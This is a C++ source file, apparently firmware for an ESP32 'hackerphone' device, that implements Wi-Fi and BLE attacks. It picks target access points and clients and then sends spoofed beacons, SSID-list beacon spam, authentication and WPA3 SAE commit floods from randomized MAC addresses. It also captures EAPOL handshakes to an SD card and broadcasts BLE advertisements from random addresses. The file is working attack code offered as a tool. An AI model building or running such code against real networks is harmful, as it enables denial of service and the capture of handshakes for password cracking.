#include "attack_service.h"
#include "radio_service.h"
#include "lab_tools.h"
#include "ble_explorer.h"
#include "mp24_board.h"
#include "storage_service.h"
#include <NimBLEDevice.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include <mbedtls/ecp.h>
#include <atomic>

namespace hackerphone {
AttackOptions attackOptions;
AttackStatus attackStatus;
static AttackOptions running;
static uint8_t ownMac[6]{},saeMaterial[96]{};
static uint32_t lastFrame=0;static uint16_t sequence=0;
static File playlist;
static RadioMode previousMode=RadioMode::Combined;static uint8_t previousLock=0;
static bool captureOwned=false;
static std::atomic<int> saeState{0}; // 0 idle, 1 building, 2 ready, -1 failed
static TaskHandle_t cryptoTask=nullptr;
static int randomBytes(void*,unsigned char* data,size_t n){esp_fill_random(data,n);return 0;}
static void prepareSae(void*) {
  mbedtls_ecp_group group;mbedtls_ecp_point point;mbedtls_mpi scalar;
  mbedtls_ecp_group_init(&group);mbedtls_ecp_point_init(&point);mbedtls_mpi_init(&scalar);
  uint8_t encoded[65]{};size_t length=0;
  bool ok=mbedtls_ecp_group_load(&group,MBEDTLS_ECP_DP_SECP256R1)==0 &&
    mbedtls_ecp_gen_keypair(&group,&scalar,&point,randomBytes,nullptr)==0 &&
    mbedtls_mpi_write_binary(&scalar,saeMaterial,32)==0 &&
    mbedtls_ecp_point_write_binary(&group,&point,MBEDTLS_ECP_PF_UNCOMPRESSED,&length,encoded,sizeof(encoded))==0 && length==65;
  if(ok)memcpy(saeMaterial+32,encoded+1,64);
  mbedtls_mpi_free(&scalar);mbedtls_ecp_point_free(&point);mbedtls_ecp_group_free(&group);
  saeState.store(ok?2:-1);vTaskDelete(nullptr);
}
bool attackSelectAp(unsigned index) {
  if(index>=ReconCore::Capacity)return false;auto& t=recon.targets[index];
  if(t.ble||!t.accessPoint||!t.fresh(millis())||!unicastAddress(t.mac)||t.channel<1||t.channel>11)return false;
  AttackTarget candidate;candidate.channel=t.channel;candidate.destinationChannel=t.channel==6?1:6;
  memcpy(candidate.bssid,t.mac,6);candidate.hasAp=true;
  snprintf(candidate.ssid,sizeof(candidate.ssid),"%.32s",t.name);attackOptions.target=candidate;return true;
}
bool attackSelectClient(unsigned index) {
  if(index>=ReconCore::Capacity||!attackOptions.target.hasAp)return false;auto& t=recon.targets[index];
  if(t.ble||!t.station||!t.fresh(millis())||!unicastAddress(t.mac)||memcmp(t.bssid,attackOptions.target.bssid,6))return false;
  memcpy(attackOptions.target.client,t.mac,6);attackOptions.target.hasClient=true;return true;
}
bool attackAvailable(AttackMode mode,char* why,size_t cap) {
  const char* error=nullptr;
  if(unsigned(mode)>=unsigned(AttackMode::Count))error="Unknown mode";
  else if(!validAttackTarget(mode,attackOptions.target))error="Select AP/client and channel";
  else if(attackOptions.durationSeconds<1||attackOptions.durationSeconds>60||attackOptions.packetsPerSecond<1||attackOptions.packetsPerSecond>100)error="Invalid duration/rate";
  else if(mode==AttackMode::SsidList&&(!mp24::cardReady||!SD.exists("/hackerphone/ssids.txt")))error="SD: /hackerphone/ssids.txt";
  else if(mode==AttackMode::ActiveEapol&&!mp24::cardReady)error="Active capture needs SD";
  else if(saeState.load()==1)error="Crypto worker finishing";
  else {auto g=gattStatus();if(g.busy||g.connected)error="Disconnect GATT first";}
  if(why&&cap)snprintf(why,cap,"%s",error?error:"Ready");return !error;
}
static bool nextSsid(char* name) {
  // Stream the playlist; retain one name, never the complete SD database.
  // Bound each step even for a large file containing only comments/long lines.
  if(!playlist)return false;
  unsigned consumed=0;size_t length=0;bool overflow=false,rewound=false;
  while(consumed++<4096){
    if(!playlist.available()){
      if(length&&!overflow&&name[0]!='#'){name[length]=0;return true;}
      if(rewound)return false;rewound=true;if(!playlist.seek(0))return false;
      length=0;overflow=false;continue;
    }
    char c=playlist.read();if(c=='\r')continue;
    if(c=='\n'){
      if(length&&!overflow&&name[0]!='#'){name[length]=0;return true;}
      length=0;overflow=false;continue;
    }
    if(c<32||c>126)overflow=true;
    if(length<32)name[length++]=c;else overflow=true;
  }
  return false;
}
bool attackStart(AttackMode mode) {
  char reason[64];if(attackStatus.active)return false;
  if(!attackAvailable(mode,reason,sizeof(reason))){snprintf(attackStatus.message,sizeof(attackStatus.message),"%s",reason);return false;}
  if(!radioPrepare()){snprintf(attackStatus.message,sizeof(attackStatus.message),"Radio init failed");return false;}
  labStop();radioStop();recon.selected=-1;running=attackOptions;attackStatus={};attackStatus.mode=mode;sequence=0;
  previousMode=radioMode;previousLock=channelLock;captureOwned=false;
  if(mode==AttackMode::SsidList){playlist=SD.open("/hackerphone/ssids.txt",FILE_READ);if(!nextSsid(running.target.ssid)){playlist.close();snprintf(attackStatus.message,sizeof(attackStatus.message),"No valid SSID lines");return false;}}
  if(!attackDefinitions[unsigned(mode)].ble){
    esp_err_t err=esp_wifi_set_mode(WIFI_MODE_STA);
    if(err==ESP_OK)err=esp_wifi_get_mac(WIFI_IF_STA,ownMac);
    if(err==ESP_OK)err=esp_wifi_set_channel(running.target.channel,WIFI_SECOND_CHAN_NONE);
    if(err!=ESP_OK){playlist.close();esp_wifi_set_mode(WIFI_MODE_NULL);attackStatus.lastError=err;snprintf(attackStatus.message,sizeof(attackStatus.message),"WiFi setup failed");return false;}
  }else{
    auto* a=NimBLEDevice::getAdvertising();a->stop();a->reset();a->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    a->setAdvertisingInterval(32);a->enableScanResponse(false);
  }
  if(mode==AttackMode::SaeCommit){
    saeState.store(1);
    if(xTaskCreate(prepareSae,"hp-sae",6144,nullptr,1,&cryptoTask)!=pdPASS){saeState.store(-1);esp_wifi_set_mode(WIFI_MODE_NULL);snprintf(attackStatus.message,sizeof(attackStatus.message),"Crypto worker unavailable");return false;}
  }
  attackStatus.active=true;
  if(!attackDefinitions[unsigned(mode)].ble){
    radioMode=RadioMode::Wifi;channelLock=radioChannel=running.target.channel;
    if(!radioStart()){attackStop();snprintf(attackStatus.message,sizeof(attackStatus.message),"RX setup failed");return false;}
    if(mode==AttackMode::ActiveEapol&&!storageStatus.recording){
      if(!captureStart(true)){attackStop();snprintf(attackStatus.message,sizeof(attackStatus.message),"PCAP start failed");return false;}captureOwned=true;
    }
  }
  attackStatus.started=millis();lastFrame=attackStatus.started-1000;
  snprintf(attackStatus.message,sizeof(attackStatus.message),"Active: %us",running.durationSeconds);return true;
}
void attackStop() {
  if(attackStatus.active){
    if(attackDefinitions[unsigned(attackStatus.mode)].ble){NimBLEDevice::getAdvertising()->stop();NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);}
    else{radioStop();esp_wifi_set_mode(WIFI_MODE_NULL);radioMode=previousMode;channelLock=previousLock;}
  }
  if(captureOwned){captureStop();captureOwned=false;}
  playlist.close();attackStatus.active=false;
  snprintf(attackStatus.message,sizeof(attackStatus.message),"Stopped");
}
void attackTick(uint32_t now) {
  if(!attackStatus.active)return;
  if(uint32_t(now-attackStatus.started)>=uint32_t(running.durationSeconds)*1000){attackStop();return;}
  auto mode=attackStatus.mode;const bool ble=attackDefinitions[unsigned(mode)].ble;
  const uint32_t interval=ble?std::max<uint32_t>(100,1000/running.packetsPerSecond):1000/running.packetsPerSecond;
  if(uint32_t(now-lastFrame)<interval)return;lastFrame=now;
  uint8_t entropy[96],frame[256],source[6];esp_fill_random(entropy,sizeof(entropy));memcpy(source,ownMac,6);
  if(mode==AttackMode::RandomBeacons||mode==AttackMode::Authentication||mode==AttackMode::SaeCommit||mode==AttackMode::Probe){memcpy(source,entropy+48,6);source[0]=(source[0]&0xfc)|2;}
  if(mode==AttackMode::SaeCommit){
    int state=saeState.load();if(state==1)return;
    if(state!=2){attackStop();++attackStatus.errors;snprintf(attackStatus.message,sizeof(attackStatus.message),"SAE key generation failed");return;}
    memcpy(entropy,saeMaterial,sizeof(entropy));
  }
  if(mode==AttackMode::SsidList&&sequence&&!nextSsid(running.target.ssid)){attackStop();++attackStatus.errors;snprintf(attackStatus.message,sizeof(attackStatus.message),"SSID playlist read failed");return;}
  size_t length=ble?buildBleAttack(frame,sizeof(frame),mode,entropy):buildWifiAttack(frame,sizeof(frame),mode,running.target,source,sequence++,entropy);
  int result=ESP_ERR_INVALID_ARG;
  if(length&&ble){
    auto* a=NimBLEDevice::getAdvertising();a->stop();NimBLEAdvertisementData data;
    uint8_t address[6];memcpy(address,entropy+64,6);address[0]|=0xc0;
    bool ok=NimBLEDevice::setOwnAddr(NimBLEAddress(address,BLE_ADDR_RANDOM))&&NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM)&&
      data.addData(frame,length)&&a->setAdvertisementData(data)&&a->start(interval+50);result=ok?ESP_OK:ESP_FAIL;
  }else if(length){
    if(frame[0]==0x80){uint64_t stamp=uint64_t(now)*1000;for(unsigned i=0;i<8;++i)frame[24+i]=stamp>>(i*8);}
    result=esp_wifi_80211_tx(WIFI_IF_STA,frame,length,false);
  }
  if(result==ESP_OK)++attackStatus.accepted;
  else{++attackStatus.errors;attackStatus.lastError=result;attackStop();snprintf(attackStatus.message,sizeof(attackStatus.message),"Driver rejected: %d",result);}
}
}
